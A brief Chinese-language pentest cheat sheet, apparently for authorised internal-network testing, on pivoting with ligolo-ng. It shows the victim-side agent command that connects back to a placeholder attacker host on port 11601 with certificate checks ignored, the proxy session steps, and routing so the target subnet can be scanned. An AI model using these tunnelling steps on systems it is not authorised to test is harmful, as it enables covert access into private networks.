# ligolo-ng 速记（授权内网）

1. 攻击机：`ligolo-proxy -selfcert`
2. 受害机：跑对应 arch 的 `agent -connect 攻击机:11601 -ignore-cert`
3. proxy 交互：`session` → `ifconfig` → `start`
4. 本机路由：给 ligolo 接口加目标网段路由后再扫

二进制不进默认 vendor；用 `bash tools/tunnel-kit/install_tunnels.sh` 拉 chisel/frp，ligolo 按需自装。
